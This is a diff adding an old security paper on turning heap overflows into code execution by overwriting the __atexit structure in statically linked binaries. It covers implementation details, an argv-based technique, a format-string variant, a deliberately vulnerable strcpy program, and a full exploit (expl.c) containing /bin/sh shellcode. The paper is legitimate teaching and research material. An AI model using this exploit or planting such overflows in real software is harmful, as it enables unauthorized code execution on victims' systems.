@@ -1,0 +1,352 @@
+/*
+** __atexit in memory bugs -
+**   specific proof of concept with statically linked binaries and
+**   heap overflows.
+**
+**                                Pascal Bouchareine <pb@hert.org>
+*/
+
+This is a very short paper showing a way to execute arbitrary
+instructions using atexit().  This is not of high interest and
+there may be a plenty of errors in it, as I wrote this while
+I was playing with the stack.
+
+For more information about heap overflows, you should better read
+shok's paper (http://www.w00w00.org/files/articles/heaptut.txt).
+
+Another interesting paper that mentions this specific technique
+is Phrack article by Bulba and Kil3r (phrack 56-5) found at
+(http://phrack.infonexus.com/search.phtml?view&article=p56-5).
+
+Many thanks to Andrew R. Reiter who took the time to review
+this Paper for corrections.
+
+
+Contents
+
+  I.   Basic knowledge of atexit()
+  II.  Implementation
+  III. Exploitation concept
+  IV.  Eggshell location independant method - no more NOPs.
+  V.   Sample exploitation
+
+
+
+I. Basic knowledge of atexit()
+
+   Let us have a look at the manpage first :
+
+	NAME
+	     atexit - register a function to be called on exit
+
+	SYNOPSIS
+	     #include <stdlib.h>
+
+	     int
+	     atexit(void (*function)(void))
+
+	DESCRIPTION
+	     The atexit() function registers the given function to be
+             called at program exit, whether via exit(3) or via return
+             from the program's main.
+	     Functions so registered are called in reverse order; no argu-
+             ments are passed.  At least 32 functions can always be registered
+             and more are allowed as long as sufficient memory can be al-
+             located.
+
+   This basic introduction let us understand that the following program :
+
+   	char *glob;
+
+        void test(void)
+        {
+           printf("%s", glob);
+        }
+
+        void main(void)
+        {
+            atexit(test);
+	    glob = "Exiting.\n";
+        }
+
+   would display "Exiting" to stdout when executed.
+
+II. Implementation
+
+   atexit is exported as a libc function. The implementation uses a
+   static struct atexit containing an array of functions to be called
+   at exit time, inserted with atexit(function), (we will call this
+   "fns"), an index to hold the next empty slot in fns (that we should
+   call "ind"), and a pointer to a next atexit struct used when fns
+   gets full (that we'll call "next"):
+
+	struct atexit {
+		struct atexit *next;            /* next in list */
+		int ind;                        /* next index in this table */
+		void (*fns[ATEXIT_SIZE])();     /* the table itself */
+	};
+
+   When atexit() is called, it fills fns[ind], and increments ind to index
+   the next free slot in fns. When fns gets full, a new struct atexit
+   is allocated, and its 'next' variable points to the last used one.
+
+   Note: Normal use of atexit does not need 'next', which is set to
+         be NULL at initialization.
+
+   When exit() is called, it parses the last defined atexit struct, and
+   executes functions found in fns[ind], decrementing ind, and following
+   next.
+
+   Since the function exit() needs to be able to lookup exit functions
+   when called, while atexit() needs to write to it, the atexit structure
+   is allocated as a global symbol, (__atexit on *bsd, __exit_funcs with
+   linux), and exported to other functions.
+
+III. Exploitation Concept
+
+   This part is not accurate enough. Depending of the way your loader maps
+   objects into memory at execution, depending your OS, depending many other
+   factors (that may induce more general usage of this particular thing),
+   your mileage may vary.
+
+   I first wanted to know where __atexit was allocated in memory, and if there
+   where any way to overwrite it. So i wrote the simple following code :
+
+		extern void * __atexit;
+
+		int main(void)
+		{
+		  static char scbuf[128];
+		  char *mabuf;
+		
+		  mabuf = (char *) malloc(128);
+		
+		  printf("__atexit at %p\n", __atexit);
+		  printf("malloced at %p\n", mabuf);
+		  printf("static   at %p\n", scbuf);
+		  return 0;
+                }
+
+   Once compiled, i had the following results :
+
+	pb@nod [405]$ gcc -o at at.c
+	pb@nod [406]$ ./at
+	__atexit at 0x280e46a0
+	malloced at 0x804b000
+	static   at 0x8049660
+
+	pb@nod [407]$ gcc -o at -static at.c
+	pb@nod [408]$ ./at
+	__atexit at 0x8052ea0
+	malloced at 0x8055000
+	static   at 0x8052e20
+
+   (why the hell didn't I use nm ? don't ask =)
+
+   This was enough for the moment. As you probably know, the dynamically
+   compiled version loads libc objects via an mmap() call, and the resulting
+   memory segment lies in a rather far-away place. (0x280e46a0) seems
+   unreachable for now, and I was happy enough with the static version.
+
+   In a statically compiled binary, libc globals are held in the heap
+   as program globals are, thus locating __atexit near our static char
+   buffer. In this specific example, __atexit is 0x80 bytes after scbuf,
+   which means contiguously positionned. This, of course, remembers you
+   of heap overflows, and this one is pretty easy to build.
+
+   By building our own __atexit struct just behind the static char buffer,
+   we could make exit() call anything we like in memory, and for example,
+   an eggshell we built in the buffer. To build this, we need a clean
+   __atexit struct which should look like (gdb-like output):
+
+   0                  127  128        132        136        140
+   (an eggshell with nops)   (next)      (ind)    (fns[0])   (fns[1])
+   0x90909090 .....        0x00000000 0x00000001 0xbffff870 0x00000000
+
+   Thus having our eggshell executed while exit() is doing :
+
+        for (p = __atexit; p; p = p->next)
+                for (n = p->ind; --n >= 0;)
+                        (*p->fns[n])();
+
+   This would be perfect, but we can't insert '\0's in our code.
+
+   You may want to give 'ind' a negative value, so fns[n] would point
+   to next, and next to our eggshell. But as you see, (ind <= 0) is
+   the termination condition of the loop.
+
+   The second method which comes to mind is to have p->next pointing
+   to a space where we can have zeroes and a handmade struct atexit.
+   We would just need to give 'ind' a negative value, and to forget
+   about the fns array.
+
+   But where the hell may we find such a space ?
+
+IV. Eggshell location independant method - no more NOPs.
+
+   I got stuck on this one for a beer or two. Reading execve's manpage,
+   and kernel execve implementation, i was reminded my first C courses.
+   When main is called, you know argc contains the number of arguments,
+   argv is the null-terminated array containing pointers to nul-terminated
+   strings, and 'envp' is the environnement. The way the kernel gives this
+   information to an executed program is easy. There is, at the top of
+   the stack, a "vector table" containing this information as well as
+   some other (signal masks, for example). If we precisely look at argv's
+   storage on stack, we dump (gdb style, again) :
+
+ 0xbfbffb60:     0x00000000      0x00000005      0xbfbffc5c      0xbfbffc84
+ 0xbfbffb70:     0xbfbffc8a      0xbfbffc8f      0xbfbffc92      0x00000000
+
+   In this example, argc is 5. The five next pointers are the five argv
+   elements. The last one is the null-terminating one.
+
+   Doesn't this recall you the struct we observed recently ? :)
+
+   This maps perfectly with a wonderfully crafted atexit struct! With ind = 5,
+   and argv[4] being the function's address. All the work is done, yet,
+   and the kernel did it. We just need to guess right address of the
+   vector table on stack, write it in __atexit->next, fill __atexit->ind with
+   a negative value, and we're done.
+
+   Guessing address of argv[] could depend of your operating system. I
+   had a look at /sys/kern/kern_exec.c, and read this function :
+
+	/*
+	 * Copy strings out to the new process address space, constructing
+	 *      new arg and env vector tables. Return a pointer to the base
+	 *      so that it can be used as the initial stack pointer.
+	 */
+	register_t *
+	exec_copyout_strings(imgp)
+
+   This explains how to calculate the vector table address of argv,
+   basing your calculation on PS_STRING (the base address of stack,
+   less struct ps_string size), the size of the signal mask,
+   "SPARE_USERSPACE" which is defined on my FreeBSD to 256 (maybe
+   this is used for setproctitle() like functions), and some other
+   complex things.
+
+   In the hope of having a portable calculation method, I used the
+   following self-calling method to have argv[]'s value. First,
+   build everyting as if you wanted to overflow the vulnerable program,
+   but don't call it : call yourself with a special argument. The argv
+   you should have at the second call is a right guess for the vulnerable
+   program too. Then call the vulnerable program.
+
+   With these two techniques, I guess you have a high working-rate overflow,
+   that doesn't need offset calculation anymore.
+
+   Note: This technique sounds quite powerful for format bugs.
+   You notice __atexit often lies in the victim at the same place as in
+   the exploit. I guess this is because of mmap() starting allocation at
+   the same fixed place. With a classical format bug, you'd just have
+   to supply "AAAA%N$x%0Xx%n", where AAAA is the address of __atexit in
+   your exploit, N is the number of words to eat from stack, and X necessary
+   to build the address of argv[] as guessed.
+
+   [post note: this was already known, in fact, and written in the
+    phrack article mentionned above]
+
+   The same way, you have an easy fixed return address for your buffer
+   overflow exploits this way: call yourself - egg shall be located in
+   an environnement variable -, and call victim once egg's address is known.
+
+V. Exploitation example
+
+   Take the following vulnerable program :
+
+                extern void * __atexit;
+
+                int main(int argc, char **argv)
+                {
+                  static char scbuf[128];
+                  char *mabuf;
+
+                  mabuf = (char *) malloc(128);
+
+                  printf("__atexit at %p\n", __atexit);
+                  printf("malloced at %p\n", mabuf);
+                  printf("static   at %p\n", scbuf);
+
+                  if (argc > 1)
+                    strcpy(scbuf, argv[1]);
+                }
+
+   The scbuf[] size is 128. We need to craft the following string:
+
+     offset   0                       128   132   136
+             [XXXXXXXXXXXX..........][AAAA][BBBB][0...]
+
+   with X being 128 bytes of garbage, AAAA being the guessed
+   argv address, BBBB being a negative number (0xffffffff will do it),
+   and the last byte being zeroed.
+
+   We must pass an eggshell as the last argument to the vulnerable program.
+
+   If the program were using strict syntax check, this would be a bit
+   more difficult to have this working. This is not discussed here
+   but may be interesting for future researchs.
+
+   So here is the exploit to spawn a shell with the above vulnerable
+   program :
+
+--- expl.c -----------------8< (lazy indenting this. :) -------------
+
+#include <stdio.h>
+
+
+#define PROG     "./vul"
+#define HEAP_LEN 128
+
+int main(int argc, char **argv)
+{
+   char **env;
+   char **arg;
+   char heap_buf[150];
+
+   char eggshell[]= /* Mudge's */
+     "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
+     "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
+     "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
+     "\x9a>:)(:<\xe8\xc6\xff\xff\xff/bin/sh";
+
+   /* Craft the first part of the chain, pointing to argv[].
+   ** We need, of course, a negative value for ind, or the real
+   ** atexit default will be called.
+   */
+
+   memset(heap_buf, 'A', HEAP_LEN);
+   *((int *) (heap_buf + HEAP_LEN))      = (int) argv - (2 * sizeof(int));
+   *((int *) (heap_buf + HEAP_LEN + 4))  = (int) 0xffffffff;
+   *((int *) (heap_buf + HEAP_LEN + 8))  = (int) 0;
+
+   /*
+   ** Build environnement. Argv[argc-1] is set to whatever
+   ** eggshell you want. This, in a struct atexit context,
+   ** will be executed by exit.
+   */
+
+   env    = (char **) malloc(sizeof(char *));
+   env[0] = 0;
+
+   arg    = (char **) malloc(sizeof(char *) * 4);
+   arg[0] = (char *) malloc(strlen(PROG) + 1);
+   arg[1] = (char *) malloc(strlen(heap_buf) + 1);
+   arg[2] = (char *) malloc(strlen(eggshell) + 1);
+   arg[3] = 0;
+
+
+   strcpy(arg[0], PROG);
+   strcpy(arg[1], heap_buf);
+   strcpy(arg[2], eggshell);
+
+   if (argc > 1) {
+     fprintf(stderr, "Using argv %x\n", argv);
+     execve("./vul", arg, env);
+   } else {
+     execve(argv[0], arg, env);
+   }
+}
+
+-------- expl.c (eof)------------------------------------------
+
